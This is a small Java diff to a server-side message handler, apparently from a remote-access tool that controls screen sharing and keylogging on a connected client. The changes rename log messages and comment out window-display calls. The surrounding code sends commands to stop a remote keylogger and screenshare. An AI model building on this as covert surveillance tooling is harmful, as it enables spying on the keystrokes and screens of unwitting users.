@@ -63,7 +63,7 @@ public class ServerMessageHandler {
                     e.getWindow().dispose();
                     c.getConnection().sendMessage(new Message("stop-screenshare"));
                     sharedScreen = null;
-                    System.out.println("JFrame Closed!");
+                    System.out.println("Screenshare Closed!");
                 }
             });
         }
@@ -81,7 +81,7 @@ public class ServerMessageHandler {
                     e.getWindow().dispose();
                     c.getConnection().sendMessage(new Message("stop-keylogger"));
                     keylogScreen = null;
-                    System.out.println("JFrame Closed!");
+                    System.out.println("Keylogger Closed!");
                 }
             });
         }
@@ -115,7 +115,8 @@ public class ServerMessageHandler {
 
             window.add(image);
             window.update(image.getGraphics());
-            window.setVisible(true);
+//            window.pack();
+//            window.setVisible(true);
         } catch (Exception e) {
             e.printStackTrace();
         }
